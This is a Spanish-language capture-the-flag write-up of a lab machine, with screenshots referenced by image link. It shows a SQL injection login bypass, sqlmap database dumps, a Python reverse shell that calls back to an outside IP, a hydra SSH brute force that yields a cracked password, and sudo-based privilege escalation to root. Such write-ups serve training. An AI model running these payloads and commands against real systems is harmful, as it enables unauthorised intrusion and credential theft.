- --
- Tags: #ejptmachine #sqlinyection #reverseshell 
---

![Pasted image 20250131185255](../../Fotos/Pasted%20image%2020250131185255.png)

![Pasted image 20250131185329](../../Fotos/Pasted%20image%2020250131185329.png)

![Pasted image 20250131185557](../../Fotos/Pasted%20image%2020250131185557.png)

![Pasted image 20250131185620](../../Fotos/Pasted%20image%2020250131185620.png)

`' or 1=1-- -`
![Pasted image 20250131185836](../../Fotos/Pasted%20image%2020250131185836.png)

`sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch --dbs`
![Pasted image 20250131192119](../../Fotos/Pasted%20image%2020250131192119.png)


`sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users --tables`
![Pasted image 20250131191918](../../Fotos/Pasted%20image%2020250131191918.png)

`sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users -T usuarios --dump`
![Pasted image 20250131192149](../../Fotos/Pasted%20image%2020250131192149.png)

Hacemos login con el usuario joe
![Pasted image 20250131192245](../../Fotos/Pasted%20image%2020250131192245.png)

Tiramos de GTFObins
![Pasted image 20250131193043](../../Fotos/Pasted%20image%2020250131193043.png)

```python
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.112', 1188))
    
    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    
    s.close()

if __name__ == "__main__":
    reverse_shell()
```

![Pasted image 20250131193618](../../Fotos/Pasted%20image%2020250131193618.png)

![Pasted image 20250131193607](../../Fotos/Pasted%20image%2020250131193607.png)

![Pasted image 20250131194246](../../Fotos/Pasted%20image%2020250131194246.png)

No nos podemos mover libremente en la CLI por lo que tenemos que buscar de que manera escalar y muchos comandos no funcionan, podríamos tirar de linpeas.py o buscamos manualmente o con find perm 644

Buscamos en directorios con ls
![Pasted image 20250131194425](../../Fotos/Pasted%20image%2020250131194425.png)

ls -la
![Pasted image 20250131194528](../../Fotos/Pasted%20image%2020250131194528.png)

`cat /tmp/.hidden_text.txt`
![Pasted image 20250131194616](../../Fotos/Pasted%20image%2020250131194616.png)
![Pasted image 20250131194626](../../Fotos/Pasted%20image%2020250131194626.png)
![Pasted image 20250131194638](../../Fotos/Pasted%20image%2020250131194638.png)
*Es necesario que las claves esten en minusculas esto lo haremos de la siguiente manera*
`cat pass.txt | tr '[:upper:]' '[:lower:]' > pass_final.txt`

`hydra -l joe -P /home/kali/Desktop/dockerlabs/pass_final.txt ssh://172.17.0.2 -t 64`
- login: joe   password: chittychittybangbang

![Pasted image 20250131201136](../../Fotos/Pasted%20image%2020250131201136.png)

![Pasted image 20250131201157](../../Fotos/Pasted%20image%2020250131201157.png)

![Pasted image 20250131201234](../../Fotos/Pasted%20image%2020250131201234.png)

Ahora tenemos acceso al `sudo -l`
![Pasted image 20250131201700](../../Fotos/Pasted%20image%2020250131201700.png)

`sudo -u luciano /usr/bin/posh`
![Pasted image 20250131202048](../../Fotos/Pasted%20image%2020250131202048.png)

![Pasted image 20250131202146](../../Fotos/Pasted%20image%2020250131202146.png)

![Pasted image 20250131202211](../../Fotos/Pasted%20image%2020250131202211.png)

![Pasted image 20250131202222](../../Fotos/Pasted%20image%2020250131202222.png)

Nota: *Tendremos permisos de lectura y escritura pero no he encontrado la manera de editar el archivo ya que este sistema no tiene ningún editor de textos instalado así que mi idea fué ejecutar un comando echo para sustituir el texto del script.*

```bash
echo '#!/bin/bash

bash -p' > script.sh
```

![Pasted image 20250131202736](../../Fotos/Pasted%20image%2020250131202736.png)

`sudo -u root /bin/bash /home/luciano/script.sh`
![Pasted image 20250131202902](../../Fotos/Pasted%20image%2020250131202902.png)

